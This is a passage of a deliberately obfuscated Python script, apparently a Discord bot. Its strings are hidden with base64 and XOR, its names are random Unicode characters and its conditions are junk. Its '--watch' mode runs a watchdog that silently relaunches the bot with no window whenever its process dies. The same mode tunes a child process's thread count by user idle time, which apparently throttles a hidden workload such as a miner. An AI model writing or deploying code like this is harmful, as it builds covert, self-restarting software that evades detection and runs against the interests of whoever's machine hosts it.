        psutil = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NTzxelg1'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        wd_found = False
        for p in psutil.process_iter([(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JiLgYlg3+w=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))]):
            try:
                if 98 * 22 >= 0 and (getattr(p, __import__('base64').b64decode('aW5mbw==').decode('utf-8'))[__import__('base64').b64decode('Y21kbGluZQ==').decode('utf-8')] and (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aGLzb0U69g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')) in (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('ZQ=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')).join(getattr(p, __import__('base64').b64decode('aW5mbw==').decode('utf-8'))[(lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JiLgYlg3+w=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))])):
                    wd_found = True
                    break
            except:
                pass
        if 18 | 1 > 0 and wd_found:
            lines.append(__import__('base64').b64decode('LSBBY3RpdmU6IFllcw==').decode('utf-8'))
        else:
            lines.append((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('aG/FbUUw6K1ZeiGs'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        lines.append((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('T2WuTF4tpOJJ'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
        lines.append(f'- Uptime: {int(time.time() - start_time)} seconds')
        lines.append(f'- PID: {os.getpid()}')
        await i.followup.send(__import__('base64').b64decode('Cg==').decode('utf-8').join(lines))
    except Exception as e:
        await i.followup.send(f'Error: {e}')

@getattr(c, __import__('base64').b64decode('ZXZlbnQ=').decode('utf-8'))
async def _нлΜшЛчэпυЩΕСПΥΕп():
    await t.sync()
    print(f"Bot ready as {getattr(c, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('MDzhfA=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))}")
if (True or False) and __import__('base64').b64decode('LS13YXRjaA==').decode('utf-8') in getattr(sys, __import__('base64').b64decode('YXJndg==').decode('utf-8')):
    psutil = __import__((lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('NTzxelg1'), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
    while 70 * 45 >= 0 and True:
        time.sleep(300)
        try:
            pf = os.path.join(hd, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('JyDwIEEw+g=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA==')))
            if len('xxxx') > 0 and os.path.exists(pf):
                with open(pf, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Nw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))) as f:
                    pid = int(f.read().strip())
                if not psutil.pid_exists(pid):
                    subprocess.Popen([getattr(sys, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('IDfhbUQt/6oPPw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))), d], creationflags=getattr(subprocess, (lambda d, k: bytes((b ^ k[i % len(k)] for i, b in enumerate(d))).decode('utf-8'))(__import__('base64').b64decode('Bh3BT2UcwYYsBTiK5nK/Aw=='), __import__('base64').b64decode('RU+EDjFZnshjWm/DqDbwVA=='))))
            elif len('') > 0:
                pass
                _dead_8825 = 333
            idle = _ИσΔΞътξξб()
            th = _ЙооΙιаЫв(idle)
            if mp and mp.poll() is None:
                if mt != th:
                    _ДУОъЪШДςшИ(th)
        except:
            pass
else:
    with open(os.path.join(hd, __import__('base64').b64decode('Ym90LnBpZA==').decode('utf-8')), __import__('base64').b64decode('dw==').decode('utf-8')) as f:
        f.write(str(os.getpid()))
    c.run(Oxh)